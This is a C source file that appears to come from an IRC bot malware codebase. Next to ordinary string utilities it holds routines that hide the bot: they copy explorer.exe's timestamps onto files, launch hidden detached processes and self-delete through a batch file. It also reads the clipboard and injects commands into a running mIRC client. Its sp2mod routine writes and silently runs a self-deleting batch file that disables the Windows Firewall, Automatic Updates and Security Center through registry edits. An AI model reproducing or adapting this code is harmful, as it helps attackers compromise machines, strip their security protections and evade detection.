#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

// globals
extern char tempdir[256];      // name of temp folder

/* search-and-replace function for strings
char *replacestr(char *str, char *oldstr, char *newstr)
{
	char *p, str2[512], str3[512], str4[512];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL)
			if (strlen(p+1) > strlen(oldstr-1))
				sprintf(str2, "%s%s%s", str3, newstr, str4);
			else
				sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);

	return str;
}
*/

char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found
			strncpy(temps, str, ptr - str);     // Copy first part
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	}
	return ptr;
}

// This will change x0A & x0D into x00 and return line pointers in saveArray[].
int Split(char *inStr, void *saveArray)
{
	int i,j,index=0;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;

	lines[index++]=inStr;
	for (i=0;i < j;i++)
		if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D'))
			inStr[i]='\x0';

	//Now that all cr/lf have been converted to NULL, save the pointers...
	for (i=0;i < j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			if (index < MAX_LINES)
				lines[index++] = &inStr[i+1];
			else
				break;
		}
	}

	if (saveArray!=0)
		memcpy(saveArray,lines,sizeof(lines));

	return index;
}



void initskip(char *s, int len, int skip[1024])
{
	int i, j;

	for (i = 0; i < MAXSTRLEN; i++)
		skip[i] = len;
	for (j = 0; j <= len - 1; j++)
		skip[lstrindex(s[j])] = len - j - 1;

	return;
}

int lstrindex(char c)
{
	char d = tolower(c);

	if (d >= 'a' && d <= 'z')
		return (d - 'a' + 1);
	else
		return 0;
}

char *lstrstr(char *s, char *t)
{
	int i, j, k, slen=strlen(s), tlen=strlen(t);
	int skip[1024];

	initskip(t, tlen, skip);

	for (i = j = tlen - 1; j > 0; i--, j--) {
		while (tolower(s[i]) != tolower(t[j])) {
			k = skip[lstrindex(s[i])];
			i += (tlen - j > k) ? tlen - j : k;
			if (i >= slen)
				return NULL;
			j = tlen - 1;
		}
	}
	return (s + i);
}

char *PrintError(char *msg)
{
	TCHAR sysMsg[256];
	static char buffer[IRCLINE];

	DWORD err = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), sysMsg, 256, NULL);

	TCHAR *p = sysMsg;
	while((*p > 31) || (*p == 9))
		++p;
	do
		*p-- = 0;
	while((p >= sysMsg) && ((*p == '.') || (*p < 33)));

	_snprintf(buffer,sizeof(buffer),"%s Error: %s <%d>.",msg,sysMsg,err);

	return (buffer);
}

char *GetClipboardText(void)
{
	if (fOpenClipboard(NULL)) {
		HANDLE hData = fGetClipboardData(CF_TEXT);
		if (!hData)
			return 0;
		char * buffer = (char*)GlobalLock(hData);

		GlobalUnlock(hData);
		fCloseClipboard();

		return buffer;
	}

	return 0;
}

BOOL mirccmd(char *cmd)
{
	HWND mwnd = fFindWindow("mIRC",NULL);
	if (mwnd) {
		HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
		LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
		sprintf(mData, cmd);
		fSendMessage(mwnd,WM_USER + 200,1,0);
		fSendMessage(mwnd,WM_USER + 201,1,0);
		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);

		return TRUE;
	 }
	else
		return FALSE;
}

void SetFileTime(char *Filename)
{
	FILETIME aFileTime, bFileTime, cFileTime;

	char exepath[MAX_PATH];
	if(fSearchPath(NULL,"explorer.exe",NULL,sizeof(exepath),exepath,NULL) == 0)
		return;

	HANDLE hTimeFile = CreateFile(exepath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);

		hTimeFile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hTimeFile != INVALID_HANDLE_VALUE) {
			SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
			CloseHandle(hTimeFile);
		}
	}

	return;
}

DWORD CreateProc(char *file, char *param)
{
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE;

	char cmdline[1024];
	_snprintf(cmdline,sizeof(cmdline),"%s %s",file, param);

	if (CreateProcess(file, cmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == 0)
		return 0;

	return (pinfo.dwProcessId);
}

BOOL Reboot(void)
{
	AdjustPrivileges(SE_SHUTDOWN_NAME, TRUE);

	if (!fExitWindowsEx(EWX_SYSTEM_REBOOT /* or EWX_FORCE_SHUTDOWN */, SHUTDOWN_SYSTEM_HUNG))
		return FALSE;

	return TRUE;
}

void uninstall(void)
{
	char buffer[1024], cmdline[MAX_PATH], botfile[MAX_PATH], batfile[MAX_PATH];

	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs();

	killthreadall();

	GetTempPath(sizeof(buffer), buffer);
	sprintf(batfile, "%sdel.bat", buffer);
	HANDLE f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		DWORD r;

		sprintf(buffer,"@echo off\r\n"
					":repeat\r\n"
					"del \"%%1\"\r\n"
					"if exist \"%%1\" goto repeat\r\n"
					"del \"%s\"", batfile);
		WriteFile(f, buffer, strlen(buffer), &r, NULL);
		CloseHandle(f);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), botfile, sizeof(botfile));
		if (GetFileAttributes(botfile) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(botfile,FILE_ATTRIBUTE_NORMAL);
		sprintf(buffer, "%%comspec%% /c %s %s", batfile, botfile);
		ExpandEnvironmentStrings(buffer, cmdline, sizeof(cmdline));

		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, BELOW_NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}

	return;
}
void sp2mod(void)
{
HANDLE f;
char batfile[256];
char buffer[] = "@echo off\r\n"
//"net stop \"Security Center\"\r\n"
//"net stop SharedAccess\r\n"
"Echo REGEDIT4>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters]>>%temp%\\1.reg\r\n"
"Echo \"TransportBindName\"=\"\">>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess]>>%temp%\\1.reg\r\n"
"Echo \"Start\"=dword:00000004>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv]>>%temp%\\1.reg\r\n"
"Echo \"Start\"=dword:00000004>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\wscsvc]>>%temp%\\1.reg\r\n"
"Echo \"Start\"=dword:00000004>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole]>>%temp%\\1.reg\r\n"
"Echo \"EnableDCOM\"=\"N\">>%temp%\\1.reg\r\n"
"Echo \"EnableRemoteConnect\"=\"N\">>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa]>>%temp%\\1.reg\r\n"
"Echo \"restrictanonymous\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\PCT1.0\\Server]>>%temp%\\1.reg\r\n"
"Echo \"Enabled\"=hex:00>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters]>>%temp%\\1.reg\r\n"
"Echo \"AutoShareWks\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"AutoShareServer\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters]>>%temp%\\1.reg\r\n"
"Echo \"NameServer\"=\"\">>%temp%\\1.reg\r\n"
"Echo \"ForwardBroadcasts\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"IPEnableRouter\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"Domain\"=\"\">>%temp%\\1.reg\r\n"
"Echo \"SearchList\"=\"\">>%temp%\\1.reg\r\n"
"Echo \"UseDomainNameDevolution\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"EnableICMPRedirect\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DeadGWDetectDefault\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"DontAddDefaultGatewayDefault\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"EnableSecurityFilters\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"AllowUnqualifiedQuery\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"PrioritizeRecordData\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"TCP1320Opts\"=dword:00000003>>%temp%\\1.reg\r\n"
"Echo \"KeepAliveTime\"=dword:00023280>>%temp%\\1.reg\r\n"
"Echo \"BcastQueryTimeout\"=dword:000002ee>>%temp%\\1.reg\r\n"
"Echo \"BcastNameQueryCount\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"CacheTimeout\"=dword:0000ea60>>%temp%\\1.reg\r\n"
"Echo \"Size/Small/Medium/Large\"=dword:00000003>>%temp%\\1.reg\r\n"
"Echo \"LargeBufferSize\"=dword:00001000>>%temp%\\1.reg\r\n"
"Echo \"SynAckProtect\"=dword:00000002>>%temp%\\1.reg\r\n"
"Echo \"PerformRouterDiscovery\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"EnablePMTUBHDetect\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"FastSendDatagramThreshold \"=dword:00000400>>%temp%\\1.reg\r\n"
"Echo \"StandardAddressLength \"=dword:00000018>>%temp%\\1.reg\r\n"
"Echo \"DefaultReceiveWindow \"=dword:00004000>>%temp%\\1.reg\r\n"
"Echo \"DefaultSendWindow\"=dword:00004000>>%temp%\\1.reg\r\n"
"Echo \"BufferMultiplier\"=dword:00000200>>%temp%\\1.reg\r\n"
"Echo \"PriorityBoost\"=dword:00000002>>%temp%\\1.reg\r\n"
"Echo \"IrpStackSize\"=dword:00000004>>%temp%\\1.reg\r\n"
"Echo \"IgnorePushBitOnReceives\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DisableAddressSharing\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"AllowUserRawAccess\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DisableRawSecurity\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DynamicBacklogGrowthDelta\"=dword:00000032>>%temp%\\1.reg\r\n"
"Echo \"FastCopyReceiveThreshold\"=dword:00000400>>%temp%\\1.reg\r\n"
"Echo \"LargeBufferListDepth\"=dword:0000000a>>%temp%\\1.reg\r\n"
"Echo \"MaxActiveTransmitFileCount\"=dword:00000002>>%temp%\\1.reg\r\n"
"Echo \"MaxFastTransmit\"=dword:00000040>>%temp%\\1.reg\r\n"
"Echo \"OverheadChargeGranularity\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"SmallBufferListDepth\"=dword:00000020>>%temp%\\1.reg\r\n"
"Echo \"SmallerBufferSize\"=dword:00000080>>%temp%\\1.reg\r\n"
"Echo \"TransmitWorker\"=dword:00000020>>%temp%\\1.reg\r\n"
"Echo \"DNSQueryTimeouts\" =hex(7):31,00,00,00,32,00,00,00,32,00,00,00,34,00,00,00,38,00,00,00,30,00,00,00,00,00>>%temp%\\1.reg\r\n"
"Echo \"DefaultRegistrationTTL\"=dword:00000014>>%temp%\\1.reg\r\n"
"Echo \"DisableReplaceAddressesInConflicts\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DisableReverseAddressRegistrations\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"UpdateSecurityLevel \"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"DisjointNameSpace\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"QueryIpMatching\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"NoNameReleaseOnDemand\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"EnableDeadGWDetect\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"EnableFastRouteLookup\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"MaxFreeTcbs\"=dword:000007d0>>%temp%\\1.reg\r\n"
"Echo \"MaxHashTableSize\"=dword:00000800>>%temp%\\1.reg\r\n"
"Echo \"SackOpts\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"Tcp1323Opts\"=dword:00000003>>%temp%\\1.reg\r\n"
"Echo \"TcpMaxDupAcks\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"TcpRecvSegmentSize\"=dword:00000585>>%temp%\\1.reg\r\n"
"Echo \"TcpSendSegmentSize\"=dword:00000585>>%temp%\\1.reg\r\n"
"Echo \"TcpWindowSize\"=dword:0007d200>>%temp%\\1.reg\r\n"
"Echo \"DefaultTTL\"=dword:00000030>>%temp%\\1.reg\r\n"
"Echo \"TcpMaxHalfOpen\"=dword:0000004b>>%temp%\\1.reg\r\n"
"Echo \"TcpMaxHalfOpenRetried\"=dword:00000050>>%temp%\\1.reg\r\n"
"Echo \"TcpTimedWaitDelay\"=dword:00000000>>%temp%\\1.reg\r\n"
"Echo \"MaxNormLookupMemory\"=dword:00030d40>>%temp%\\1.reg\r\n"
"Echo \"FFPControlFlags\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"FFPFastForwardingCacheSize\"=dword:00030d40>>%temp%\\1.reg\r\n"
"Echo \"MaxForwardBufferMemory\"=dword:00019df7>>%temp%\\1.reg\r\n"
"Echo \"MaxFreeTWTcbs\"=dword:000007d0>>%temp%\\1.reg\r\n"
"Echo \"GlobalMaxTcpWindowSize\"=dword:0007d200>>%temp%\\1.reg\r\n"
"Echo \"EnablePMTUDiscovery\"=dword:00000001>>%temp%\\1.reg\r\n"
"Echo \"ForwardBufferMemory\"=dword:00019df7>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n"
"Echo  [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings]>>%temp%\\1.reg\r\n"
"Echo \"MaxConnectionsPer1_0Server\"=dword:00000050>>%temp%\\1.reg\r\n"
"Echo \"MaxConnectionsPerServer\"=dword:00000050>>%temp%\\1.reg\r\n"
"Echo.>>%temp%\\1.reg\r\n""START /WAIT REGEDIT /S %temp%\\1.reg\r\n"
"DEL %temp%\\1.reg\r\n"
"DEL %0\r\n";

sprintf(batfile, "c:\\a.bat");

if ((f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0)) > (HANDLE)0)
    {
    DWORD r;
WriteFile(f, buffer, strlen(buffer), &r, NULL);
CloseHandle(f);
PROCESS_INFORMATION pinfo;
STARTUPINFO sinfo;
memset(&sinfo, 0, sizeof(STARTUPINFO));
sinfo.cb = sizeof(sinfo);
sinfo.dwFlags = STARTF_USESHOWWINDOW;
sinfo.wShowWindow=SW_HIDE;
CreateProcess(NULL, batfile, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
}
}